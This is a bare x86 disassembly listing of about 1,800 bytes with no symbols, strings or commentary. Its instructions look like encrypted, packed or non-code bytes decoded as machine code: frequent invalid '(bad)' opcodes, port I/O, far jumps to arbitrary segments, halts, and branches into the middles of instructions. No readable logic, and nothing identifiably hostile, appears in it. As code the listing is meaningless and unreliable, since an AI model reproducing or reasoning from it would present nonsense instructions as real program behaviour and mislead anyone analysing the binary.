  405fa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fa9:	imul   edi,DWORD PTR [edx-0xd],0x3f3b760f
  405fb0:	mov    edi,0x6b047af8
  405fb5:	enter  0xcf26,0x18
  405fb9:	xor    esp,ebx
  405fbb:	ins    BYTE PTR es:[edi],dx
  405fbc:	dec    edx
  405fbd:	lds    edi,FWORD PTR [eax+ecx*2+0xca7803a]
  405fc4:	cmp    DWORD PTR [eax-0x63],eax
  405fc7:	std    
  405fc8:	cmp    ecx,ebx
  405fca:	clc    
  405fcb:	iret   
  405fcc:	in     eax,0x41
  405fce:	in     al,dx
  405fcf:	mov    edi,0x4cc60f85
  405fd4:	add    BYTE PTR [esi+ebp*2],0x20
  405fd8:	aad    0x7c
  405fda:	and    DWORD PTR [esi+0x3d],ebx
  405fdd:	lods   al,BYTE PTR ds:[esi]
  405fde:	imul   edi,DWORD PTR [ebx],0x3e
  405fe1:	jl     0x406048
  405fe3:	ffreep st(3)
  405fe5:	xor    ah,BYTE PTR ds:0x890b64ee
  405feb:	push   0x29ab3990
  405ff0:	mov    ecx,0x7264fd50
  405ff5:	jmp    0x4062e5
  405ffa:	iret   
  405ffb:	rcl    ebx,cl
  405ffd:	retf   
  405ffe:	ror    ebx,cl
  406000:	xlat   BYTE PTR ds:[ebx]
  406001:	(bad)  [ecx]
  406003:	lods   eax,DWORD PTR ds:[esi]
  406004:	and    al,0xa9
  406006:	cld    
  406007:	or     ebx,DWORD PTR [ebx-0x49]
  40600a:	mov    edx,eax
  40600c:	js     0x406086
  40600e:	dec    ebp
  40600f:	jle    0x406089
  406011:	js     0x405ff5
  406013:	sar    BYTE PTR [eax-0x2e824bf5],cl
  406019:	imul   edx,DWORD PTR [edx-0x4f],0xf6af422c
  406020:	jo     0x40609e
  406022:	dec    edx
  406023:	inc    ecx
  406024:	push   esi
  406025:	adc    esp,DWORD PTR [eax+0x64]
  406028:	jns    0x406011
  40602a:	and    eax,0x918c5d89
  40602f:	inc    edx
  406030:	adc    al,0x1c
  406032:	das    
  406033:	clc    
  406034:	popf   
  406035:	daa    
  406036:	repz inc edx
  406038:	jmp    0x2a8c:0xbd94d25a
  40603f:	dec    ebp
  406040:	push   ss
  406041:	enter  0x7ef5,0x79
  406045:	adc    DWORD PTR [ebx-0x43],ebp
  406048:	and    BYTE PTR [eax-0x36],al
  40604b:	adc    DWORD PTR [edx],ebp
  40604d:	sbb    bh,BYTE PTR [edx+eax*1+0x1780d1eb]
  406054:	mul    BYTE PTR [edx]
  406056:	push   ds
  406057:	adc    esp,DWORD PTR [edx+0x45297168]
  40605d:	sbb    ch,BYTE PTR [ebp+0xa8992f3]
  406063:	mov    esp,0xf4b4945b
  406068:	pop    es
  406069:	inc    esi
  40606a:	ja     0x4060e1
  40606c:	loopne 0x406018
  40606e:	scas   al,BYTE PTR es:[edi]
  40606f:	mov    esi,DWORD PTR [ebx-0x6d]
  406072:	adc    cl,BYTE PTR [ebp-0x75]
  406075:	mov    eax,0xaf6690b2
  40607a:	cs shr esi,0x9d
  40607e:	or     ch,BYTE PTR [edx+0x31]
  406081:	jno    0x406059
  406083:	loop   0x406028
  406085:	(bad)  
  406086:	or     edx,0x73
  406089:	inc    eax
  40608a:	inc    esp
  40608b:	dec    esi
  40608c:	or     DWORD PTR [edi+0x63],edx
  40608f:	jb     0x40609a
  406091:	cmp    DWORD PTR [esi+0x41],0xa49e5421
  406098:	xchg   esi,eax
  406099:	mov    edi,0x419ae10b
  40609e:	shr    BYTE PTR [edx+0x3c],cl
  4060a1:	retf   
  4060a2:	and    eax,0x3f7d01bf
  4060a7:	aaa    
  4060a8:	pop    ecx
  4060a9:	adc    ah,BYTE PTR [ecx]
  4060ab:	fsubr  QWORD PTR [edx-0x410a834e]
  4060b1:	and    DWORD PTR [ebp-0x4a],0x61
  4060b5:	ficom  WORD PTR [ecx]
  4060b7:	inc    eax
  4060b8:	jle    0x40610f
  4060ba:	gs or  eax,0xe921ff4
  4060c0:	ret    0xfc6b
  4060c3:	retf   0xf28
  4060c6:	out    0xaa,al
  4060c8:	jb     0x406093
  4060ca:	add    al,0x74
  4060cc:	(bad)  
  4060cd:	mov    esi,0x7686857f
  4060d2:	cmc    
  4060d3:	xor    eax,0x5dee1248
  4060d8:	sub    BYTE PTR [eax+0x3d44483a],dl
  4060de:	mov    al,BYTE PTR [esi]
  4060e0:	aaa    
  4060e1:	dec    eax
  4060e2:	mov    ch,0x18
  4060e4:	xor    eax,0xf897c381
  4060e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060ea:	xchg   esp,eax
  4060eb:	lods   al,BYTE PTR ds:[esi]
  4060ec:	sub    BYTE PTR ds:0x6c95eec4,0x7a
  4060f3:	add    al,0xb4
  4060f5:	into   
  4060f6:	js     0x406163
  4060f8:	mov    esi,0xac16e7dc
  4060fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060fe:	shl    ch,cl
  406100:	call   0x393f7087
  406105:	scas   al,BYTE PTR es:[edi]
  406106:	lea    ebx,[edx]
  406108:	nop
  406109:	mov    ch,0xc4
  40610b:	in     al,0x9a
  40610d:	fcmovnu st,st(1)
  40610f:	popa   
  406110:	out    dx,al
  406111:	jmp    0x6fd256a3
  406116:	jge    0x406107
  406118:	fstp   TBYTE PTR [ebx+0x5d]
  40611b:	out    dx,al
  40611c:	clc    
  40611d:	lods   al,BYTE PTR ds:[esi]
  40611e:	pop    ss
  40611f:	mov    dl,0x22
  406121:	sbb    DWORD PTR [ebx+0x1e],edx
  406124:	popf   
  406125:	lods   eax,DWORD PTR ds:[esi]
  406126:	mov    DWORD PTR [eax+0x4eee235a],esi
  40612c:	cdq    
  40612d:	mov    ds:0x25ca7b8b,al
  406132:	and    eax,0x1a3a7dce
  406137:	rep outs dx,DWORD PTR ds:[esi]
  406139:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40613a:	sub    DWORD PTR [edi-0x66],esp
  40613d:	jg     0x4060c5
  40613f:	mov    cl,0x68
  406141:	out    dx,eax
  406142:	push   ecx
  406143:	lock hlt 
  406145:	lods   al,BYTE PTR ds:[esi]
  406146:	jle    0x40615f
  406148:	jmp    DWORD PTR es:[eax]
  40614b:	mov    eax,ds:0x520ffa64
  406150:	dec    ebx
  406151:	push   ecx
  406152:	sub    al,ah
  406154:	xchg   BYTE PTR [edx+0x6c9a787b],cl
  40615a:	jbe    0x4060e9
  40615c:	pop    eax
  40615d:	dec    esi
  40615e:	es mov dh,0xa9
  406161:	jb     0x40616b
  406163:	daa    
  406164:	mov    ecx,0x493d5654
  406169:	mov    eax,0x78adf743
  40616e:	in     eax,dx
  40616f:	es push ecx
  406171:	and    al,0x83
  406173:	sbb    edx,DWORD PTR [eax+0x45]
  406176:	loop   0x4061e8
  406178:	inc    BYTE PTR [esp+ebx*4]
  40617b:	sub    cl,BYTE PTR [ebp+0x1633643d]
  406181:	repnz call 0xe5fc:0xfaa09e90
  406189:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40618a:	jle    0x406171
  40618c:	mov    dh,0xff
  40618e:	hlt    
  40618f:	loop   0x4061b5
  406191:	and    dh,BYTE PTR [edi]
  406193:	nop
  406194:	shl    DWORD PTR [esi],0xc1
  406197:	hlt    
  406198:	push   es
  406199:	test   al,0x4c
  40619b:	addr16 inc eax
  40619d:	out    0xe7,eax
  40619f:	sar    BYTE PTR [edx],cl
  4061a1:	out    0x80,al
  4061a3:	outs   dx,BYTE PTR ds:[esi]
  4061a4:	jmp    0xf6d2:0x1a7a881a
  4061ab:	mov    BYTE PTR [edx-0x13],al
  4061ae:	(bad)  
  4061af:	dec    edi
  4061b0:	lods   eax,DWORD PTR ds:[esi]
  4061b1:	fld    QWORD PTR [ebp-0x47aba0e8]
  4061b7:	mov    ebp,0xde650075
  4061bc:	jb     0x4061f6
  4061be:	fld    QWORD PTR [edx+0xc7568b]
  4061c4:	mov    dl,0x3a
  4061c6:	sub    ah,BYTE PTR [ecx+edx*4-0x25e10583]
  4061cd:	mov    al,ds:0xf5c5bd6a
  4061d2:	sbb    DWORD PTR [ecx],eax
  4061d4:	hlt    
  4061d5:	mov    edi,0xd4ad28d6
  4061da:	push   eax
  4061db:	jp     0x406218
  4061dd:	jg     0x40621a
  4061df:	pop    esp
  4061e0:	inc    esp
  4061e1:	xor    BYTE PTR [esi-0x4],dl
  4061e4:	out    0x15,eax
  4061e6:	mov    esp,0xdfdc27f0
  4061eb:	dec    ebx
  4061ec:	xchg   esi,eax
  4061ed:	mov    ebp,0x733cfc9
  4061f2:	retf   0xcf7e
  4061f5:	in     eax,dx
  4061f6:	jmp    0x4061ea
  4061f8:	jb     0x40619e
  4061fa:	xchg   esi,eax
  4061fc:	retf   0x30c
  4061ff:	shl    dh,1
  406201:	loop   0x406230
  406203:	enter  0x9281,0x61
  406207:	inc    ebx
  406208:	xchg   DWORD PTR [esi+0x77],ebp
  40620b:	push   eax
  40620c:	mov    cl,0x60
  40620e:	and    esi,ebx
  406210:	rol    DWORD PTR [esp+edx*8+0x41],1
  406214:	xor    DWORD PTR [edi+edi*2+0x6b],ecx
  406218:	jge    0x4061c1
  40621a:	pop    ss
  40621b:	(bad)  
  40621c:	push   esi
  40621d:	aam    0xf5
  40621f:	popa   
  406220:	int3   
  406221:	ja     0x40627c
  406223:	pop    ebp
  406224:	inc    edx
  406225:	out    dx,eax
  406226:	das    
  406227:	and    bl,BYTE PTR [edi+0x43]
  40622a:	xchg   BYTE PTR [ebx+0x26],dl
  40622d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40622e:	cwde   
  40622f:	sbb    BYTE PTR [edi],dh
  406231:	dec    esp
  406232:	(bad)  
  406233:	cmp    al,0xf8
  406235:	jge    0x406227
  406237:	xchg   edi,eax
  406238:	outs   dx,BYTE PTR ds:[esi]
  406239:	xor    cl,dl
  40623b:	mul    BYTE PTR [edi]
  40623d:	inc    edi
  40623e:	test   DWORD PTR ds:0xa6407b90,eax
  406244:	sbb    esi,edi
  406246:	clc    
  406247:	inc    ebx
  406248:	mov    al,ds:0x2a05417
  40624d:	fwait
  40624e:	adc    ecx,ebp
  406250:	add    dh,BYTE PTR [edi]
  406252:	sub    esi,DWORD PTR [ecx]
  406254:	xchg   edi,eax
  406255:	push   ebx
  406256:	cmp    BYTE PTR [ebp+0xf],ch
  406259:	call   0x9457686
  40625e:	mov    ah,0xe8
  406260:	mov    al,0xca
  406262:	pop    edi
  406263:	xor    eax,0x19fac1d2
  406268:	or     al,0x54
  40626a:	lock je 0x406212
  40626d:	xchg   ebx,eax
  40626e:	dec    ecx
  40626f:	mov    ds:0x800ba64,eax
  406274:	popa   
  406275:	fsubr  QWORD PTR [esi+0x59cbb701]
  40627b:	ins    BYTE PTR es:[edi],dx
  40627c:	mul    DWORD PTR [edi+ebx*4+0x2a033851]
  406283:	push   ecx
  406284:	inc    esp
  406285:	mov    ah,0x7e
  406287:	pop    ebp
  406288:	out    dx,eax
  406289:	imul   ebx,DWORD PTR [ecx-0x6],0xffffffa5
  40628d:	enter  0x4fdb,0x3
  406291:	into   
  406292:	stos   BYTE PTR es:[edi],al
  406293:	push   ss
  406294:	imul   ebx,DWORD PTR [ebp+0x7c],0x3c
  406298:	pop    edi
  406299:	loopne 0x406279
  40629b:	imul   esi,DWORD PTR [ebp+ebx*4-0x76],0x678074e3
  4062a3:	mov    ds:0xa6ebd187,eax
  4062a8:	add    eax,0x3ed3909b
  4062ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4062ae:	gs xor ecx,eax
  4062b1:	inc    edx
  4062b2:	xor    eax,0xbcc2dc80
  4062b7:	out    0x67,al
  4062b9:	mov    DWORD PTR [ebx+0x39926fa4],ebp
  4062bf:	jae    0x406297
  4062c1:	fs mov ch,0x5d
  4062c4:	pop    esi
  4062c5:	mov    WORD PTR [edx],es
  4062c7:	ins    DWORD PTR es:[edi],dx
  4062c8:	add    ah,ah
  4062ca:	sbb    BYTE PTR [ebp-0x685d51ee],al
  4062d0:	ins    BYTE PTR es:[edi],dx
  4062d1:	sbb    DWORD PTR [edi],0xffffff8a
  4062d4:	scas   al,BYTE PTR es:[edi]
  4062d5:	and    BYTE PTR [eax-0x4e],ah
  4062d8:	ror    BYTE PTR [edi+0x3f2abf05],1
  4062de:	fidivr WORD PTR [esi+esi*2+0x2a]
  4062e2:	xchg   DWORD PTR [edi+eiz*1-0x9],edx
  4062e6:	icebp  
  4062e7:	mov    ecx,DWORD PTR [ebp+0x10]
  4062ea:	jmp    0x4065da
  4062ef:	(bad)  
  4062f0:	aas    
  4062f1:	ret    0xc9c2
  4062f4:	rol    esi,0xcb
  4062f7:	sbb    DWORD PTR [ebp-0x64],0xb5727f5c
  4062fe:	rcr    esi,1
  406300:	(bad)  
  406301:	js     0x40637b
  406303:	dec    ebp
  406304:	jle    0x40637e
  406306:	js     0x406312
  406308:	lahf   
  406309:	add    al,bl
  40630b:	mov    esi,0xa1f9e0e9
  406310:	lds    ecx,FWORD PTR [edx+eiz*2+0x5d]
  406314:	(bad)
  406317:	xor    eax,0xe4093160
  40631c:	outs   dx,BYTE PTR ds:[esi]
  40631d:	xor    ebp,edi
  40631f:	jae    0x406384
  406321:	or     eax,0x34b5e8c8
  406326:	retf   
  406327:	shl    esp,cl
  406329:	sbb    al,0xcb
  40632b:	or     esi,edx
  40632d:	push   edx
  40632e:	jp     0x40634e
  406330:	and    DWORD PTR [ebx-0x42],0x4
  406334:	int    0xf4
  406336:	xor    eax,DWORD PTR [edx+0x7f]
  406339:	mov    ebp,0x3659229d
  40633e:	repz test al,0x62
  406341:	push   esi
  406342:	sahf   
  406343:	add    BYTE PTR [edx],bl
  406345:	dec    ebx
  406346:	pusha  
  406347:	pop    ecx
  406348:	cmp    edx,DWORD PTR [edi]
  40634a:	pop    ecx
  40634b:	pop    esi
  40634c:	sbb    esi,DWORD PTR [eax]
  40634e:	mov    BYTE PTR [ebx+0x7b50f96f],bl
  406354:	and    cl,al
  406356:	add    al,BYTE PTR [ebx]
  406358:	pushf  
  406359:	in     eax,0xd1
  40635b:	neg    DWORD PTR [ebx+0x3b]
  40635e:	neg    dh
  406360:	pop    ds
  406361:	clc    
  406362:	leave  
  406363:	stc    
  406364:	imul   ebp,edi,0x75f1d427
  40636a:	not    DWORD PTR [bx]
  40636d:	mov    BYTE PTR [edx],0xa1
  406370:	std    
  406371:	push   ds
  406372:	(bad)  
  406373:	bound  esi,QWORD PTR [edx+ebx*8+0x8]
  406377:	push   edi
  406378:	ja     0x4062fb
  40637a:	call   0x15b5:0x4f518dce
  406381:	ret    
  406382:	nop
  406383:	dec    esi
  406384:	sbb    al,0xb0
  406386:	loopne 0x406348
  406388:	out    0xd0,al
  40638a:	outs   dx,BYTE PTR ds:[esi]
  40638b:	inc    edi
  40638c:	daa    
  40638d:	fdiv   DWORD PTR [ecx]
  40638f:	lods   eax,DWORD PTR ds:[esi]
  406390:	int3   
  406391:	jecxz  0x4063d9
  406393:	out    dx,eax
  406394:	dec    ecx
  406395:	in     eax,0x93
  406397:	fwait
  406398:	mov    ebx,0x8900f44e
  40639d:	adc    DWORD PTR [ecx-0x5254125f],edx
  4063a3:	push   ebx
  4063a4:	jns    0x406404
  4063a6:	lock dec esp
  4063a8:	shl    ch,cl
  4063aa:	mov    ds:0xa3b9548c,eax
  4063af:	mov    edi,0x947b9c5e
  4063b4:	pop    ss
  4063b5:	jo     0x406427
  4063b7:	cmp    al,0xef
  4063b9:	out    dx,al
  4063ba:	mov    gs,WORD PTR [eax-0x6ab8133b]
  4063c0:	add    al,0xe7
  4063c2:	shl    DWORD PTR [edx-0x3196ca5a],cl
  4063c8:	mov    edx,0x3bd2d378
  4063cd:	ins    DWORD PTR es:[edi],dx
  4063ce:	sub    eax,0x85d63cc0
  4063d3:	cdq    
  4063d4:	pop    esp
  4063d5:	xchg   ecx,eax
  4063d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063d7:	add    eax,ebp
  4063d9:	pop    es
  4063da:	(bad)  
  4063db:	cli    
  4063dc:	(bad)  es:[ecx-0x7b]
  4063e0:	jecxz  0x4063a5
  4063e2:	das    
  4063e3:	repz sbb cl,bh
  4063e6:	mov    esp,0x56cc94de
  4063eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063ec:	dec    ecx
  4063ed:	push   ds
  4063ee:	in     eax,dx
  4063ef:	adc    BYTE PTR [ecx+0x46],ch
  4063f2:	lds    esi,FWORD PTR [esi+0x15]
  4063f5:	sub    dl,BYTE PTR [edi]
  4063f7:	pushf  
  4063f8:	test   DWORD PTR [edi+0xea9d02b],edx
  4063fe:	mov    ch,0xb3
  406400:	frstor [edi+eiz*4-0xa27fae6]
  406407:	lock fadd QWORD PTR [ebp+eiz*2-0x7259c20c]
  40640f:	sbb    esp,DWORD PTR gs:[edi+0x6b119a13]
  406416:	inc    eax
  406417:	push   ebp
  406418:	aad    0xcd
  40641a:	aam    0x39
  40641c:	dec    ecx
  40641d:	js     0x406410
  40641f:	jb     0x40649c
  406421:	lea    esp,[eax]
  406423:	cld    
  406424:	jmp    0x10fb:0x18210dc7
  40642b:	leave  
  40642c:	xchg   BYTE PTR [edx-0x38],al
  40642f:	push   esp
  406430:	repz add bl,BYTE PTR ss:[ebp-0x680649c7]
  406438:	int3   
  406439:	pop    ds
  40643a:	cli    
  40643b:	add    edi,DWORD PTR ds:0x9e20008e
  406441:	mov    ds:0xc1b55e5e,al
  406446:	inc    edi
  406447:	fucomi st,st(6)
  406449:	sbb    ecx,edi
  40644b:	test   eax,0xa0d1747f
  406450:	cld    
  406451:	mov    ch,ah
  406453:	cld    
  406454:	adc    BYTE PTR [edx],ch
  406456:	mov    al,0xe4
  406458:	aas    
  406459:	fmulp  st(2),st
  40645b:	arpl   WORD PTR [ecx],cx
  40645d:	bound  esi,QWORD PTR [edi-0x2c]
  406460:	rol    BYTE PTR es:[esi-0x2182f8b3],cl
  406467:	xchg   ecx,eax
  406468:	fidiv  WORD PTR [ecx+0x428d29bd]
  40646e:	xor    ebx,DWORD PTR [edx]
  406470:	sub    al,bl
  406472:	inc    esp
  406473:	adc    ch,BYTE PTR [ebx+0x69]
  406476:	(bad)  
  406477:	pop    esi
  406478:	sbb    BYTE PTR [edi+0x79fafe9e],dh
  40647e:	std    
  40647f:	mov    dl,0x7c
  406481:	dec    edx
  406482:	pop    eax
  406483:	int3   
  406484:	and    al,0x2f
  406486:	sbb    dl,al
  406488:	mov    ss,WORD PTR [eax]
  40648a:	test   al,0x13
  40648c:	adc    eax,0xa72f2986
  406491:	sub    BYTE PTR [ecx-0x52],ah
  406494:	fcmovnb st,st(2)
  406496:	int    0x1f
  406498:	out    0xc8,eax
  40649a:	ror    DWORD PTR [esi],0xf9
  40649d:	jp     0x4064a8
  40649f:	jmp    0x406508
  4064a1:	(bad)  
  4064a2:	mov    esi,0xc22557e3
  4064a7:	lods   al,BYTE PTR ds:[esi]
  4064a8:	mov    eax,0x2a0bdc9c
  4064ad:	lods   eax,DWORD PTR ds:[esi]
  4064ae:	add    DWORD PTR [ebx],0x9129292a
  4064b4:	dec    ebx
  4064b5:	add    al,0x32
  4064b7:	push   eax
  4064b8:	dec    edi
  4064b9:	dec    edx
  4064ba:	loopne 0x406466
  4064bc:	pop    edx
  4064bd:	sub    al,0x3a
  4064bf:	sbb    bh,ch
  4064c1:	nop
  4064c2:	mov    dh,0x1c
  4064c4:	das    
  4064c5:	dec    esi
  4064c6:	lds    ebx,FWORD PTR [edi]
  4064c8:	popf   
  4064c9:	in     eax,0xca
  4064cb:	mov    ch,0xc8
  4064cd:	sub    al,0xd3
  4064cf:	cmp    eax,0xde9e448f
  4064d4:	mov    ebp,0x9aa0d35
  4064d9:	mov    bl,BYTE PTR [ecx-0x22]
  4064dc:	and    DWORD PTR [ebx],ebp
  4064de:	lock jg 0x40651b
  4064e1:	idiv   DWORD PTR [edi+eiz*4]
  4064e4:	jmp    0x3b6b:0x983e254c
  4064eb:	sbb    BYTE PTR [di],al
  4064ee:	std    
  4064ef:	push   ebp
  4064f0:	or     eax,0xf0776f13
  4064f5:	dec    esp
  4064f6:	fdivr  st,st(3)
  4064f8:	push   edx
  4064f9:	popf   
  4064fa:	dec    eax
  4064fb:	mov    bl,0x2b
  4064fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4064fe:	mov    WORD PTR [ebx+0x3b],cs
  406501:	(bad)  
  406502:	hlt    
  406503:	or     eax,0xe48491c
  406508:	shl    DWORD PTR [ebp-0x10],0x5e
  40650c:	xchg   ebp,eax
  40650e:	mov    ebx,0x77c2eab4
  406513:	sti    
  406514:	fsub   DWORD PTR [ebx+0x39]
  406517:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406518:	frstor [edx+esi*2+0x72]
  40651c:	imul   ebp,DWORD PTR [ecx-0x5c],0x66
  406520:	push   ebp
  406521:	ret    
  406522:	test   BYTE PTR [edx],ah
  406524:	(bad)  
  406525:	mov    al,0x3c
  406527:	xchg   DWORD PTR [ebp+0x5f],ebp
  40652a:	sbb    dh,cl
  40652c:	clc    
  40652d:	repz inc edi
  40652f:	jbe    0x406524
  406531:	mov    ecx,0x6e037b49
  406536:	push   esp
  406537:	push   ss
  406538:	push   esp
  406539:	and    edx,ecx
  40653b:	sbb    BYTE PTR [edx+0x92727ef],al
  406541:	cmp    DWORD PTR [edx],ebx
  406543:	imul   edi,ecx,0x42
  406546:	pop    ds
  406547:	(bad)  
  406548:	push   ecx
  406549:	sub    BYTE PTR [ebx+0x32],0xa4
  40654d:	pop    ecx
  40654e:	pusha  
  40654f:	cli    
  406550:	gs cmp ah,0xc7
  406554:	push   es
  406555:	(bad)  
  406557:	out    0x98,al
  406559:	mov    ebp,0xf225cd4f
  40655e:	jb     0x4064fa
  406560:	fidivr DWORD PTR ds:0x254ea20
  406566:	and    BYTE PTR [ebx+esi*4-0x3b2e7c24],ch
  40656d:	mov    esp,0xc671e6f4
  406572:	retf   
  406573:	adc    ebp,DWORD PTR ds:0xd2ff24d6
  406579:	mov    dh,0x83
  40657b:	not    DWORD PTR [esi+0x464e5d03]
  406581:	or     ah,cl
  406583:	mov    cl,0x24
  406585:	daa    
  406586:	fld    QWORD PTR [ecx+0x65]
  406589:	mov    ah,0x68
  40658b:	repnz stos BYTE PTR es:[di],al
  40658e:	sbb    al,0x82
  406590:	cmp    al,0x33
  406592:	cmp    eax,0xa2688247
  406597:	jmp    0xf4fcbbe7
  40659c:	std    
  40659d:	into   
  40659e:	mov    eax,ds:0x9225a97
  4065a3:	xor    eax,0x75df9b45
  4065a8:	fisubr DWORD PTR [ebx+0x60]
  4065ab:	add    BYTE PTR [edx-0x9],bl
  4065ae:	pop    esi
  4065af:	mov    bh,0xcf
  4065b1:	and    DWORD PTR [esi-0x2f],ecx
  4065b4:	xchg   BYTE PTR [esi+0x5b4445ec],ch
  4065ba:	addr16 aam 0x82
  4065bd:	dec    edx
  4065be:	xchg   edi,eax
  4065bf:	jmp    0xf2646c1c
  4065c4:	imul   ebp,ecx,0x79968e9b
  4065ca:	mov    cl,0x54
  4065cc:	jecxz  0x406618
  4065ce:	cli    
  4065cf:	jmp    0x115bbb76
  4065d4:	lock fwait
  4065d6:	mov    ds:0x23a606bf,eax
  4065db:	enter  0xc981,0x8e
  4065df:	sbb    eax,0xc18b8116
  4065e4:	jmp    0x4068d4
  4065e9:	ds enter 0x3dcf,0xcd
  4065ee:	cmp    eax,0xabe7cfce
  4065f3:	mov    ch,cl
  4065f5:	(bad)  
  4065f6:	fisubr WORD PTR [ecx]
  4065f8:	and    al,0x33
  4065fa:	les    edi,FWORD PTR [eax+0x78]
  4065fd:	dec    ebp
  4065fe:	jle    0x406678
  406600:	js     0x406639
  406602:	in     eax,0x3
  406604:	mov    dh,0x21
  406606:	ffreep st(0)
  406608:	popa   
  406609:	loop   0x406662
  40660b:	xchg   BYTE PTR [edi+0x6b8724ed],ch
  406611:	outs   dx,BYTE PTR ds:[esi]
  406612:	mov    bl,0xf
  406614:	inc    edi
  406615:	mov    ds:0x657eb08b,al
  40661a:	in     al,dx
  40661b:	es push esp
  40661d:	mov    edi,0x348695d3
  406622:	lahf   
  406623:	xlat   BYTE PTR ds:[ebx]
  406624:	fnsave [ebx]
  406626:	(bad)  
  406627:	out    0xfa,al
  406629:	repnz dec ecx
  40662b:	cmp    al,al
  40662d:	lahf   
  40662e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40662f:	fsub   DWORD PTR [ecx-0x70]
  406632:	repnz mov ah,0xc5
  406635:	or     edx,DWORD PTR [edi+edx*4]
  406638:	ss ins BYTE PTR es:[edi],dx
  40663a:	mov    cl,0x53
  40663c:	int3   
  40663d:	push   ss
  40663e:	in     al,0xf7
  406640:	xor    ebx,DWORD PTR [ecx+0x16]
  406643:	inc    DWORD PTR [edx+0x3d]
  406646:	jo     0x406602
  406648:	jmp    0x406638
  40664a:	(bad)  
  40664b:	out    dx,eax
  40664c:	fmul   st,st(5)
  40664e:	sahf   
  40664f:	stos   BYTE PTR es:[edi],al
  406650:	fwait
  406651:	inc    ecx
  406652:	lahf   
  406653:	je     0x4066aa
  406655:	cmp    al,0x17
  406657:	cmp    edi,edi
  406659:	aaa    
  40665a:	jb     0x4065ec
  40665c:	add    DWORD PTR [ebp+0x6650516e],esi
  406662:	sbb    al,0xd1
  406664:	or     DWORD PTR [ecx-0x650e4df1],edi
  40666a:	cmp    al,0xf8
  40666c:	lahf   
  40666d:	dec    esi
  40666e:	out    0xd8,eax
  406670:	and    ebx,esp
  406672:	dec    edx
  406673:	lods   al,BYTE PTR ds:[esi]
  406674:	inc    esi
  406675:	inc    edi
  406676:	popa   
  406677:	lea    ebx,[eax-0x586fc3dd]
  40667d:	adc    edx,edx
  40667f:	call   0xc438bad6
  406684:	sbb    ecx,DWORD PTR [esi+eiz*2+0x13286b6f]
  40668b:	add    esp,DWORD PTR [ecx]
  40668d:	cli    
  40668e:	fnstenv [eax+0x64]
  406691:	push   cs
  406692:	std    
  406693:	or     eax,0x83942978
  406698:	add    eax,esi
  40669a:	shl    DWORD PTR [ecx+0x49],0xfa
  40669e:	ret    
  40669f:	lock pushw 0xffcc
  4066a3:	jmp    0x406648
  4066a5:	(bad)  
  4066a6:	sub    esi,DWORD PTR [edi-0x3d]
  4066a9:	sar    DWORD PTR [eax-0x79],0xad
  4066ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066ae:	dec    ebx
  4066af:	lea    edx,[ebx-0x10]
  4066b2:	in     eax,dx
  4066b3:	data16 sahf 
  4066b5:	inc    ecx
  4066b6:	fwait
  4066b7:	arpl   si,dx
  4066b9:	push   eax
  4066ba:	stc    
  4066bb:	(bad)  
  4066bc:	mov    eax,esi
  4066be:	ret    
  4066bf:	xor    eax,0x61f83a8f
  4066c4:	dec    edi
  4066c5:	push   esp
  4066c6:	mov    edx,0xda8dd5e4
  4066cb:	(bad)  
  4066cc:	jbe    0x4066d1
  4066ce:	or     edi,edi
  4066d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066d1:	shl    BYTE PTR [eax+0x2dec485d],1
  4066d7:	bound  eax,QWORD PTR [ebx+0xc]
  4066da:	push   ds
  4066db:	or     ch,BYTE PTR [edi+0xba039e1]
  4066e1:	dec    edi
  4066e2:	add    al,BYTE PTR ds:0x71f53606
  4066e8:	inc    edi
  4066e9:	fisubr DWORD PTR [ebx+0x57]
  4066ec:	mov    ds:0x71d616fc,al
  4066f1:	or     dl,cl
  4066f3:	aad    0x5b
  4066f5:	cmp    eax,0x9fec4c62
  4066fa:	js     0x40668f
  4066fc:	jge    0x4066bc
  4066fe:	repnz nop
  406700:	jl     0x4066f8
  406702:	jns    0x4066a3
  406704:	lahf   
  406705:	test   BYTE PTR [eax+edx*4+0x21],0x87
  40670a:	sub    al,0x42
  40670c:	cdq    
  40670d:	pop    ecx
  40670e:	cmp    esp,DWORD PTR [edx+0x7703493a]
  406714:	sbb    ah,BYTE PTR [eax]
  406716:	mov    ds:0x65105e5a,eax
  40671b:	push   ecx
  40671c:	inc    edi
  40671d:	std    
  40671e:	push   eax
  40671f:	push   ds
  406720:	js     0x406770
  406722:	pusha  
  406723:	into   
  406724:	mov    ds:0xbc47bf7a,eax
  406729:	fimul  DWORD PTR [edi]
  40672b:	mov    esp,0xeac51664
  406730:	jmp    0x3420d098
  406735:	mov    BYTE PTR [ebp-0x6d],0x32
  406739:	jmp    0xa413:0xe4d3157c
  406740:	int    0x9f
  406742:	push   ebp
  406743:	fsubr  QWORD PTR [edi-0x7]
  406746:	aad    0x44
  406748:	mov    ebp,0xc22605f6
  40674d:	jge    0x4067bb
  40674f:	in     al,dx
  406750:	mov    ch,BYTE PTR [esi+edx*1]
  406753:	pusha  
  406754:	adc    DWORD PTR [edx-0x22],0x43
  406758:	jae    0x4066e0
  40675a:	jl     0x40672f
  40675c:	sub    al,0x9a
  40675e:	lea    esp,[ebx-0x48]
  406761:	std    
  406762:	pop    esi
  406763:	repnz pop eax
  406765:	or     BYTE PTR [esi-0x4e8b0dab],bl
  40676b:	rcr    DWORD PTR [eax],1
  40676d:	pop    ebx
  40676e:	adc    BYTE PTR [ecx],al
  406770:	jmp    0xc5735d34
  406775:	call   0x3093:0xcac1dae9
  40677c:	lds    esp,FWORD PTR [edi]
  40677e:	inc    edx
  40677f:	add    bh,BYTE PTR [edx+0x37]
  406782:	nop
  406783:	iret   
  406784:	or     eax,0xb832e38d
  406789:	das    
  40678a:	sub    BYTE PTR [ecx+0x4f],dh
  40678d:	lods   eax,DWORD PTR ds:[esi]
